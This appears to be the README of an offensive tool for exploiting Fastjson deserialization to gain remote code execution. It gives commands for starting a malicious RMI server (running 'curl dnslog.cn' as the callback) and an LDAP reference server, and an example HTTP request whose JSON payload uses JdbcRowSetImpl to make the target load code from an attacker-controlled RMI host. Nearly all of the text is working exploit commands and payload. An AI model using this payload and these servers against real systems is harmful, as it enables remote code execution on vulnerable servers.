# fastjson_rce_tool

rmi:
java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl dnslog.cn"


ladp:
java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888

示例：

```
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ip:port/Object","autoCommit":true}
```


![0](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/work.png)

![1](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/2.png)

